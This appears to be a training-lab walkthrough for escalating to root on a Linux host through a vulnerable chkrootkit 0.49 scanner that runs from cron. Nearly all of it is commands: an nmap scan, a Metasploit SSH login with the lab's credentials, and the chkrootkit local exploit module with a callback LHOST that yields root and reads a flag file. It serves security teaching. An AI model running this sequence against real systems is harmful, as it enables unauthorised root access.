# Privilege Escalation - Rootkit Scanner

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 5329–5378. Examples are lab-specific and need verification.

This lab focuses on exploiting a vulnerable rootkit scanner on a Linux server, guiding participants through steps such as identifying services, gaining initial access, and performing local privilege escalation. The exercise underscores the importance of understanding and mitigating known vulnerabilities in system utilities.

In this lab, the target server is running a vulnerable Rootkit Scanner. Your task is to exploit a known issue using the appropriate Metasploit module and escalate it to the root user.

**Objective:** Escalate to the root user on the target machine and retrieve the flag!

**SSH Login Credentials:**

| Username | Password | | jackie | password |

**Tools: msf, bash, terminal, nmap**

```bash
nmap -sS -sV demo.ine.local
#port 22 ssh OpensSSH

msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USERNAME jackie
set PASSWORD password
exploit

sessions -i 1
meterpreter> ps aux
#Observe, that there are a couple of processes running i.e. cron and one bash script.

#Investigate the check-down bash script.
cat /bin/check-down

#The chkrootkit rootkit scanner is running as root every 60 seconds. Check the chkrootkit location and its version.
command -v chkrootkit
/bin/chkrootkit -V

# We found the chkrootkit binary location and its version. Searching privilege escalation exploit module for chkrootkit 0.49.
searchsploit chkrootkit 0.49

#The current version of chkrootkit is vulnerable to local privilege escalation. We will use the Metasploit module to gain root access and read the flag file which is located under the /root directory.

use exploit/unix/local/chkrootkit
set CHKROOTKIT /bin/chkrootkit
set session 1
set LHOST 192.60.22.2
exploit
cat /root/flag

```
